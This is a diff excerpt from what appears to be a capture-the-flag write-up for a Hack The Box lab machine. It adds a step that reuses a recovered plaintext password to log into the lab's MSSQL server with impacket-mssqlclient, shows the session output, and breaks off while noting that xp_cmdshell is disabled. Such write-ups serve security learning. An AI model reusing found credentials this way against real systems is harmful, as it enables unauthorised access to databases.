@@ -293,4 +293,21 @@ So ill try:
 sa:m$$ql_S@_P@ssW0rd!
 ```
 
-# Access on `ms-s`
+# Access on `ms-sql`
+```python
+impacket-mssqlclient htb.local/admin:'m$$ql_S@_P@ssW0rd!'@mantis.htb.local
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2014 RTM (no SP) (12.0.2000)
+[!] Press help for extra shell commands
+SQL (admin  admin@master)> 
+```
+Using the same user `admin` and the password im able to get access
+
+`xp_cmdshell` is disabled and im not able to re-e
